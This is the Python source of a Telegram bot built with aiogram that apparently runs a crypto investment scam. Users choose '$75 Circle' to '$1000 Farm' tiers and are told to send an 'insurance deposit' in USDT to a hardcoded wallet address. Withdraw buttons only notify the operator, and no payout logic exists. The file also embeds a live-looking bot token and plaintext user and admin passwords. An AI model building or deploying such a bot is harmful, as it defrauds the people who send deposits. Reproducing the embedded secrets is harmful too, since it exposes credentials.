import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton

# ====== Настройки ======
API_TOKEN = "8216116135:AAGTNq-_V89z6Lp_vWZ4ZTP1C1wsy-gtfiY"
ADMIN_ID = 7625893405 # твой Telegram ID

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# ====== Логины ======
USER_LOGIN = "pronto"
USER_PASSWORD = "ZeMDZxwv"

ADMIN_LOGIN = "SuperAdm1nX"
ADMIN_PASSWORD = "7vZ#9qLp!2T"

# ====== Данные ======
users = {} # user_id: {"working_balance": int, "insurance_balance": int}
pending = [] # pending deposits
auth_stage = {} # user_id: "login" / "password_user" / "password_admin"

# ====== Keyboards ======
def main_kb():
kb = ReplyKeyboardMarkup(resize_keyboard=True)
kb.add("📊 Balance")
kb.add("🟢 $75 [Circle]", "🌾 $500 [Agro Farm]", "🏭 $1000 [Farm]")
return kb

def deposit_kb():
kb = ReplyKeyboardMarkup(resize_keyboard=True)
kb.add("🔄 Check Payment Status")
return kb

def balance_kb():
kb = ReplyKeyboardMarkup(resize_keyboard=True)
kb.add("➕ Deposit", "➖ Withdraw")
return kb

def admin_kb():
kb = ReplyKeyboardMarkup(resize_keyboard=True)
kb.add("📋 Pending Deposits", "📬 User Requests")
return kb

# ====== START ======
@dp.message_handler(commands=["start"])
async def start(message: types.Message):
uid = message.from_user.id
auth_stage[uid] = "login"
await message.answer("🔐 Enter login:")

# ====== AUTH ======
@dp.message_handler()
async def auth(message: types.Message):
uid = message.from_user.id
text = message.text
stage = auth_stage.get(uid, None)
if stage is None:
return

if stage == "login":
if text == USER_LOGIN:
auth_stage[uid] = "password_user"
await message.answer("🔑 Enter password:")
elif text == ADMIN_LOGIN:
auth_stage[uid] = "password_admin"
await message.answer("🔑 Enter admin password:")
else:
await message.answer("❌ Wrong login")

elif stage == "password_user":
if text == USER_PASSWORD:
users.setdefault(uid, {"working_balance": 0, "insurance_balance": 0})
auth_stage.pop(uid)
await message.answer("✅ Logged in as user", reply_markup=main_kb())
else:
await message.answer("❌ Wrong password")

elif stage == "password_admin":
if uid == ADMIN_ID and text == ADMIN_PASSWORD:
auth_stage.pop(uid)
await message.answer("🛡 Admin panel", reply_markup=admin_kb())
else:
await message.answer("❌ Wrong admin password")

# ====== USER BUTTONS ======
def deposit_text(amount):
return (
f"💎 To activate your account, please deposit an insurance deposit of **${amount}**.\n\n"
f"💰 **USDT (BEP20)** address:\n"
f"`0xf3a329bf7e26fc7d2fd69762b2336805f378d07a`\n\n"
f"📌 After sending, press the button below to check payment status.\n"
f"🔥 Send correct amount to activate account!"
)

@dp.message_handler(lambda m: m.text in ["🟢 $75 [Circle]", "🌾 $500 [Agro Farm]", "🏭 $1000 [Farm]"])
async def deposit_menu(message: types.Message):
uid = message.from_user.id
amount_map = {"🟢 $75 [Circle]": 75, "🌾 $500 [Agro Farm]": 500, "🏭 $1000 [Farm]": 1000}
amount = amount_map.get(message.text, 0)
if amount == 0:
return
pending.append({"user_id": uid, "amount": amount})
await message.answer(deposit_text(amount), reply_markup=deposit_kb(), parse_mode="Markdown")

@dp.message_handler(text="🔄 Check Payment Status")
async def check_payment(message: types.Message):
uid = message.from_user.id
user_pending = [p for p in pending if p["user_id"] == uid]
if user_pending:
for dep in user_pending:
await message.answer(f"⏳ Payment of ${dep['amount']} pending. Wait for admin confirmation 💎")
else:
await message.answer("✅ No pending deposits. Your account is active! 🎉")

@dp.message_handler(text="📊 Balance")
async def show_balance(message: types.Message):
uid = message.from_user.id
users.setdefault(uid, {"working_balance": 0, "insurance_balance": 0})
w_bal = users[uid]["working_balance"]
i_bal = users[uid]["insurance_balance"]
await message.answer(
f"💰 Balances:\n🛠 Working deposit: ${w_bal}\n🛡 Insurance deposit: ${i_bal}",
reply_markup=balance_kb()
)

@dp.message_handler(lambda m: m.text in ["➕ Deposit", "➖ Withdraw"])
async def deposit_withdraw_request(message: types.Message):
uid = message.from_user.id
action = message.text
await bot.send_message(ADMIN_ID, f"📣 User {uid} requested: {action}")
await message.answer(f"📨 Your request '{action}' sent to admin!")

# ====== ADMIN BUTTONS ======
@dp.message_handler(text="📋 Pending Deposits")
async def admin_pending(message: types.Message):
if message.from_user.id != ADMIN_ID:
return
if not pending:
await message.answer("📭 No pending deposits")
return
for dep in pending:
text = f"👤 User ID: {dep['user_id']}\n💰 Amount: ${dep['amount']}"
kb = InlineKeyboardMarkup()
cb_ok = f"ok_{dep['user_id']}_{dep['amount']}"
cb_no = f"no_{dep['user_id']}_{dep['amount']}"
kb.add(
InlineKeyboardButton("✅ Received", callback_data=cb_ok),
InlineKeyboardButton("❌ Not received", callback_data=cb_no)
)
await message.answer(text, reply_markup=kb)

@dp.message_handler(text="📬 User Requests")
async def admin_requests(message: types.Message):
await message.answer("📨 User deposit/withdraw requests are sent to admin directly.")

@dp.callback_query_handler(lambda c: c.data.startswith("ok_") or c.data.startswith("no_"))
async def handle_callback(callback: types.CallbackQuery):
try:
action, uid, amount = callback.data.split("_")
uid = int(uid)
amount = int(amount)
except Exception:
await callback.answer("❌ Invalid callback data")
return

if action == "ok":
users.setdefault(uid, {"working_balance": 0, "insurance_balance": 0})
users[uid]["insurance_balance"] += amount
pending[:] = [p for p in pending if not (p["user_id"] == uid and p["amount"] == amount)]
await bot.send_message(uid, f"✅ Deposit ${amount} received. Account active! 🎉")
await callback.answer("Confirmed")
elif action == "no":
pending[:] = [p for p in pending if not (p["user_id"] == uid and p["amount"] == amount)]
await bot.send_message(uid, f"❌ Deposit ${amount} not received. Try again!")
await callback.answer("Rejected")

# ====== RUN ======
if __name__ == "__main__":
executor.start_polling(dp, skip_updates=True)
